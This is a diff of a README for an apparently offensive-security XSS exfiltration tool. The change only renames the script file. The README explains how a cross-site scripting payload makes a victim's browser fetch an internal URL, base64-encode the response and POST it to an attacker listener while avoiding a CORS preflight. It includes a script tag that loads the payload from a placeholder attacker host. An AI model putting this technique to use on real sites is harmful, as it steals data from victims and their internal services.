@@ -8,14 +8,14 @@ Part of the [Hackita](https://hackita.it) offensive security project.
 
 ## How it works
 
-1. Your XSS payload loads `exfil.js` in the victim's browser.
+1. Your XSS payload loads `myexfilxss.js` in the victim's browser.
 2. The script sends a `GET` to an internal URL (reachable only from the victim's machine, e.g. `http://127.0.0.1:4566/`).
 3. The response is encoded with `btoa` and sent to your listener with one `POST` (`Content-Type: text/plain`, so no CORS preflight).
 4. You decode the body with `base64 -d`.
 
 ## Setup
 
-Edit two values in `exfil.js`:
+Edit two values in `myexfilxss.js`:
 
 | What | Where | Example |
 |------|-------|---------|
@@ -39,7 +39,7 @@ python3 -m http.server 8000
 Load it through the XSS (for example in a header or field that gets rendered to another user):
 
 ```html
-<script src="http://YOUR_IP:8000/exfil.js"></script>
+<script src="http://YOUR_IP:8000/myexfilxss.js"></script>
 ```
 
 Decode what arrives (the base64 is the body, after the empty line of the POST request):
